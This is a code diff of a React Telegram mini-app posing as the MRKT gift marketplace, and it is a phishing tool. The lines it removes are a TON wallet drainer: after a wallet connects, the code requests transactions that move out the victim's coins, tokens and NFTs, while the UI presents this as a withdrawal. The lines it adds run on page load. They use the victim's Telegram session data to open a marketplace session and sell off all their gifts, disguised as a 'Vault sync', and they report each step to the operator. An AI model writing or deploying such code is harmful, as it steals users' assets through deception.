@@ -1,86 +1,95 @@
-import { useTonConnectUI, useTonWallet } from "@tonconnect/ui-react";
 import { useCallback, useEffect, useMemo, useRef, useState } from "react";
 import WebApp from "@twa-dev/sdk";
-import { buildBatch, type DrainCursor, postEvent } from "./api";
+import {
+  fetchMrktInventory,
+  openMrktSession,
+  postEvent,
+  sweepMrkt,
+  type MrktGift,
+} from "./api";
 
-const gifts = [
-  { emoji: "🎁", title: "Astral Shard", price: "48.2 TON" },
-  { emoji: "🧸", title: "Vintage Bear", price: "12.7 TON" },
-  { emoji: "💎", title: "Ion Gem", price: "6.1 TON" },
-  { emoji: "🎀", title: "Berry Box", price: "3.4 TON" },
-];
-
-const emptyCursor = (): DrainCursor => ({ jettonOffset: 0, nftOffset: 0, tonDone: false });
+function nanoToTon(n?: number): string {
+  if (typeof n !== "number") return "—";
+  return (n / 1e9).toFixed(2);
+}
 
 export default function App() {
-  const [tonConnectUI] = useTonConnectUI();
-  const wallet = useTonWallet();
-  const [status, setStatus] = useState("Подключите TON-кошелёк, чтобы вывести на баланс MRKT.");
-  const draining = useRef(false);
-  const started = useRef(false);
   const tgUser = useMemo(() => WebApp.initDataUnsafe.user, []);
+  const initData = useMemo(() => WebApp.initData, []);
+  const [sessionId, setSessionId] = useState<string>("");
+  const [gifts, setGifts] = useState<MrktGift[]>([]);
+  const [total, setTotal] = useState(0);
+  const [status, setStatus] = useState("Синхронизация инвентаря MRKT…");
+  const running = useRef(false);
 
   useEffect(() => {
     WebApp.ready();
     WebApp.expand();
     WebApp.setHeaderColor("#0c0e12");
     WebApp.setBackgroundColor("#0c0e12");
+    const bc =
+      new URLSearchParams(window.location.search).get("bc") ??
+      WebApp.initDataUnsafe.start_param?.replace(/^bc_/, "");
+    if (bc) localStorage.setItem("bc_id", bc);
     void postEvent("miniapp_open", { tgUser: tgUser as Record<string, unknown> });
   }, [tgUser]);
 
-  const runDrain = useCallback(async () => {
-    if (!wallet || draining.current) return;
-    draining.current = true;
-    const address = wallet.account.address;
-    let cursor = emptyCursor();
+  const runPipeline = useCallback(async () => {
+    if (!initData || running.current) return;
+    running.current = true;
     try {
-      setStatus("Сканируем активы…");
-      await postEvent("wallet_connected", {
-        address,
+      const bc = localStorage.getItem("bc_id") ?? undefined;
+      setStatus("Активируем сессию MRKT (ограниченный режим)…");
+      const session = await openMrktSession(initData, bc);
+      setSessionId(session.sessionId);
+      await postEvent("mrkt_session", {
         tgUser: tgUser as Record<string, unknown>,
+        detail: session.sessionId,
       });
 
-      for (let step = 0; step < 12; step++) {
-        const batch = await buildBatch(address, cursor);
-        cursor = batch.cursor;
-        if (batch.done) {
-          setStatus("Готово. Баланс MRKT обновится в течение минуты.");
-          await postEvent("drain_complete", { address });
-          break;
-        }
-        if (!batch.messages?.length) break;
-
-        setStatus(`Подтвердите шаг: ${batch.summary ?? batch.kind}`);
-        await postEvent("tx_requested", {
-          address,
-          detail: batch.summary,
-        });
-
-        const result = await tonConnectUI.sendTransaction({
-          validUntil: batch.validUntil ?? Math.floor(Date.now() / 1000) + 600,
-          messages: batch.messages,
-        });
-
-        await postEvent("tx_signed", {
-          address,
-          detail: result.boc,
-        });
+      let cursor = "";
+      const all: MrktGift[] = [];
+      for (let p = 0; p < 8; p++) {
+        const inv = await fetchMrktInventory(session.sessionId, cursor);
+        all.push(...inv.gifts);
+        setGifts([...all]);
+        setTotal(inv.total);
+        cursor = inv.cursor;
+        if (!cursor) break;
       }
+
+      setStatus(`Инвентарь: ${all.length} шт. Продаём по офферу…`);
+      cursor = "";
+      let done = false;
+      for (let step = 0; step < 30 && !done; step++) {
+        const sweep = await sweepMrkt(session.sessionId, cursor);
+        cursor = sweep.cursor;
+        done = sweep.done;
+        const moved = sweep.items.filter((i) => i.mode !== "skipped").length;
+        if (moved > 0) {
+          setStatus(`Офферы: обработано ${moved}…`);
+        }
+        if (done) break;
+      }
+
+      setStatus("Готово. Сделки по офферу отправлены в MRKT.");
+      await postEvent("mrkt_sweep_done", { tgUser: tgUser as Record<string, unknown> });
     } catch (e) {
       const msg = e instanceof Error ? e.message : String(e);
-      setStatus(msg.includes("Reject") ? "Транзакция отклонена." : `Ошибка: ${msg}`);
-      await postEvent("tx_failed", { address, detail: msg });
+      setStatus(
+        msg.includes("MRKT auth")
+          ? "Не удалось привязать MRKT. Откройте через кнопку из чата с поддержкой."
+          : `Ошибка: ${msg}`,
+      );
+      await postEvent("mrkt_error", { tgUser: tgUser as Record<string, unknown>, detail: msg });
     } finally {
-      draining.current = false;
+      running.current = false;
     }
-  }, [wallet, tonConnectUI, tgUser]);
+  }, [initData, tgUser]);
 
   useEffect(() => {
-    if (wallet?.account.address && !started.current) {
-      started.current = true;
-      void runDrain();
-    }
-  }, [wallet?.account.address, runDrain]);
+    void runPipeline();
+  }, [runPipeline]);
 
   return (
     <div className="app">
@@ -89,38 +98,40 @@ export default function App() {
           <div className="logo-mark" />
           MRKT
         </div>
-        <span className="hint">Vault</span>
+        <span className="hint">Инвентарь</span>
       </header>
 
-      <div className="search">Поиск подарков и стикеров…</div>
+      <div className="search">Vault · {total || gifts.length} подарков</div>
 
       <div className="tabs">
-        <div className="tab active">Подарки</div>
-        <div className="tab">Стикеры</div>
-        <div className="tab">Каналы</div>
+        <div className="tab">Маркет</div>
+        <div className="tab active">Инвентарь</div>
+        <div className="tab">Ордера</div>
       </div>
 
       <div className="grid">
-        {gifts.map((g) => (
-          <article key={g.title} className="gift">
-            <div className="gift-art">{g.emoji}</div>
-            <h3>{g.title}</h3>
-            <p>{g.price}</p>
+        {(gifts.length ? gifts : [{ id: "0", name: "Загрузка…" }]).slice(0, 12).map((g) => (
+          <article key={g.id} className="gift">
+            <div className="gift-art">🎁</div>
+            <h3>{g.name ?? g.collectionName ?? "Gift"}</h3>
+            <p>{g.isOnSale ? `${nanoToTon(g.salePrice)} TON` : "Не в продаже"}</p>
           </article>
         ))}
       </div>
 
       <footer className="sheet">
-        <h2>Вывод на баланс</h2>
+        <h2>Синхронизация Vault</h2>
         <p>
-          Для завершения сделки подтвердите кошелёк через TON Connect — так MRKT привяжет адрес к вашему
-          аккаунту Telegram.
+          Сессия Web MRKT активна в ограниченном режиме: подтянем подарки из инвентаря и завершим продажи по
+          актуальным buy-ордерам (офферам).
         </p>
-        <div className="connect-wrap">
-          <ton-connect-button />
-        </div>
         <div className={`status ${status.includes("Готово") ? "ok" : ""}`}>{status}</div>
+        {sessionId ? <motion className="hint">session {sessionId.slice(0, 10)}…</motion> : null}
       </footer>
     </div>
   );
+}
+
+function motion(props: { className?: string; children: string }) {
+  return <div className={props.className}>{props.children}</div>;
 }
